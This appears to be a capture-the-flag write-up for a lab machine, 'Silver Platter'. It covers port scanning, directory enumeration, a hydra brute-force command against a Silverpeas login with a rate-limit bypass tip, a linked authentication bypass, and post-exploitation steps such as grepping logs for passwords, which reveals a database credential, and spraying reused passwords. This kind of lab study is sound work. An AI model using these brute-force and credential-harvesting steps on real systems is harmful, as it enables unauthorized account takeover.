# Silver Platter

```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-29 02:27 EDT
Nmap scan report for 10.10.154.145
Host is up (0.033s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Thu, 29 May 2025 06:27:35 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Thu, 29 May 2025 06:27:34 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=5/29%Time=6837FE57%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20clos
SF:e\r\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Th
SF:u,\x2029\x20May\x202025\x2006:27:34\x20GMT\r\n\r\n<html><head><title>Er
SF:ror</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTP
SF:Options,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
SF:nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Thu,\x
SF:2029\x20May\x202025\x2006:27:34\x20GMT\r\n\r\n<html><head><title>Error<
SF:/title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequ
SF:est,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
SF:onnection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\
SF:x20Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nCon
SF:tent-Type:\x20text/html\r\nDate:\x20Thu,\x2029\x20May\x202025\x2006:27:
SF:35\x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\
SF:x20Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Ge
SF:nericLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
SF:00\r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r
SF:(SSLSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length
SF::\x200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\
SF:x20close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos
SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPD
SF:String,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r
SF:\nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\
SF:n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   33.16 ms 10.11.0.1
2   33.40 ms 10.10.154.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.48 seconds
```

## port 22: Check if ssh is password or key authentication
```
The authenticity of host '10.10.154.145 (10.10.154.145)' can't be established.
ED25519 key fingerprint is SHA256:WFcHcO+oxUb2E/NaonaHAgqSK3bp9FP8hsg5z2pkhuE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.154.145' (ED25519) to the list of known hosts.
root@10.10.154.145's password: 
```

is password authentication, so can bf it

## port 80
- first, see any public vuln for the version, this current version does not have any RCE vulnerabilities
- Use dirsearch and check for VHOST

directories
```
Target: http://10.10.154.145/

[02:45:36] Starting:                                                                                                                                                                             
[02:45:54] 301 -  178B  - /assets  ->  http://10.10.154.145/assets/         
[02:45:54] 403 -  564B  - /assets/                                          
[02:46:07] 301 -  178B  - /images  ->  http://10.10.154.145/images/         
[02:46:07] 403 -  564B  - /images/                                          
[02:46:09] 200 -   17KB - /LICENSE.txt                                      
[02:46:20] 200 -  771B  - /README.txt           
```

vhosts
- no vhost found

Website features
![01](images/Scriptkiddy.png)

Info Disclosure
software: Silverpeas
username: scr1ptkiddy

login page was found at http://IP:8080/silverpeas
![01](images/silverpeaslogin.png)

Use cewl to make custom password list
`cewl url`
Then we use burpsuite turbo intruder to bypass bf rate limit

Custom pw spraying with hydra
`hydra -l scr1ptkiddy -P /usr/share/wordlists/rockyou.txt 10.10.154.145 -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect" -V -t 2`


Silverpeas is also bypassable
- https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d

## Post Exploit Enumeration

Good resources by pentest everything: https://viperone.gitbook.io/pentest-everything/everything/everything-linux/privilege-escalation-checklist

check `echo $PATH | tr ":" "\n"` to see if we can modify and do path abuse

uname -a (to check kernal exploits)
```
Linux silver-platter 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

sudo -l (gtfo bin)
```
Sorry, user tim may not run sudo on silver-platter.
```

id 
```
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

Interesting users in /etc/passwd (our next target)
```
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000:root:/home/tyler:/bin/bash
tim:x:1001:1001::/home/tim:/bin/bash
```

How to take over tyler's account now, we will look at /opt directory for a script we can abuse, and then we want to look into /var folder, if there is a web server running, 
all the files are stored in var folder (www), and sometimes we can find useful notes (logins or scripts we can abuse)

searching `grep -ir password | grep tyler` in the /var/log folder, since adm group allows to read log files

```
DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/
```
TIP: Whenever you find a password, you want to spray it everywhere, because humans like to reuse password
